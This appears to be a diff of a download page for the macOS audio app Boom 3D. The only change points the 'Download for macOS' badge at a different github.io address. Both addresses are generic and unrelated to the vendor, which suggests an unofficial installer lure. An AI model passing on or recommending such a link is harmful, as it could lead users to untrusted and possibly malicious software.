@@ -6,7 +6,7 @@
 <h3>Boom 3D for macOS</h3>
 <p>Boom 3D is a specialized 3D surround sound and audio enhancement app designed for users who want a reliable, Mac‑native tool with clear controls and stable performance.</p>
 
-<a href="https://install-software-utility.github.io/.github/">
+<a href="https://software-app-osx-install.github.io/.github/bmm">
   <img src="https://i.postimg.cc/7LTTZgxF/macos-badge-noborder.png" width="200" alt="Download for macOS"/>
 </a>
 </div>
